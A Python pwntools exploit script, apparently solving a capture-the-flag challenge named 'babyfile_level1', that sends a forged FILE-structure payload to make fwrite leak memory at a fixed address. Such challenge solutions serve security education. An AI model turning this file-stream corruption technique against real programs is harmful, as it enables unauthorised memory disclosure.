from pwn import *

# Set up connection
#context.log_level = 'debug'
p = process('./babyfile_level1')  # or remote connection
s = '''
b * fwrite
'''


offset_to_write_base = 0x8 * 1
payload = p64(0x800)
payload += b"\x00" * offset_to_write_base  # Padding
payload += p64(0x4040e0)
payload += p64(0)
payload += p64(0x4040e0)
payload += p64(0x4040e0+0x120) 
payload += b'\x00' * (0x8 * 8)
payload += p64(1)


p.sendline(payload)

# Get output which should contain the flag
p.interactive()
